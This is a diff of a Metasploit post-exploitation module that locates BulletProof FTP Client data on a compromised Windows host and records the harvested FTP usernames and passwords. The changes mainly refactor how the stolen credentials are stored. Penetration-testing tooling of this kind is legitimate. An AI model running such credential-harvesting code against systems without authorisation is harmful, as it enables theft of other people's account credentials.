@@ -1,5 +1,5 @@
 ##
-# This module requires Metasploit: http//metasploit.com/download
+# This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
@@ -171,22 +171,16 @@ class Metasploit3 < Msf::Post
   end
 
   def check_bulletproof(user_dir)
-    session.fs.dir.foreach(user_dir) do |dir|
-      if dir =~ /BulletProof Software/
-        vprint_status("BulletProof Data Directory found at #{user_dir}\\#{dir}")
-        return "#{user_dir}\\#{dir}"#"\\BulletProof FTP Client\\2010\\sites\\Bookmarks"
+    session.fs.dir.foreach(user_dir) do |directory|
+      if directory =~ /BulletProof Software/
+        vprint_status("BulletProof Data Directory found at #{user_dir}\\#{directory}")
+        return "#{user_dir}\\#{directory}"#"\\BulletProof FTP Client\\2010\\sites\\Bookmarks"
       end
     end
     return nil
   end
 
   def report_findings(entries)
-
-    if session.db_record
-      source_id = session.db_record.id
-    else
-      source_id = nil
-    end
 
     entries.each{ |entry|
       @credentials << [
@@ -199,17 +193,32 @@ class Metasploit3 < Msf::Post
         entry[:local_dir]
       ]
 
-      report_auth_info(
-        :host  => entry[:site_address],
-        :port => entry[:port],
-        :proto => 'tcp',
-        :sname => 'ftp',
-        :user => entry[:login],
-        :pass => entry[:password],
-        :ptype => 'password',
-        :source_id => source_id,
-        :source_type => "exploit"
-      )
+      service_data = {
+        address: Rex::Socket.getaddress(entry[:site_address]),
+        port: entry[:port],
+        protocol: "tcp",
+        service_name: "ftp",
+        workspace_id: myworkspace_id
+      }
+
+      credential_data = {
+        origin_type: :session,
+        session_id: session_db_id,
+        post_reference_name: self.refname,
+        username: entry[:login],
+        private_data: entry[:password],
+        private_type: :password
+      }
+
+      credential_core = create_credential(credential_data.merge(service_data))
+
+      login_data = {
+        core: credential_core,
+        access_level: "User",
+        status: Metasploit::Model::Login::Status::UNTRIED
+      }
+
+      create_credential_login(login_data.merge(service_data))
     }
   end
 
@@ -233,12 +242,14 @@ class Metasploit3 < Msf::Post
 
     print_status("Searching BulletProof FTP Client installation directory...")
     # BulletProof FTP Client 2.6 uses the installation dir to store bookmarks files
-    program_files_x86 = expand_path('%ProgramFiles(X86)%')
-    if not program_files_x86.empty? and program_files_x86 !~ /%ProgramFiles\(X86\)%/
-      program_files = program_files_x86 #x64
+    progfiles_env = session.sys.config.getenvs('ProgramFiles(X86)', 'ProgramFiles')
+    progfilesx86 = progfiles_env['ProgramFiles(X86)']
+    if !progfilesx86.blank? && progfilesx86 !~ /%ProgramFiles\(X86\)%/
+      program_files = progfilesx86 # x64
     else
-      program_files = expand_path('%ProgramFiles%') #x86
+      program_files = progfiles_env['ProgramFiles'] # x86
     end
+
     session.fs.dir.foreach(program_files) do |dir|
       if dir =~ /BulletProof FTP Client/
         vprint_status("BulletProof Installation directory found at #{program_files}\\#{dir}")
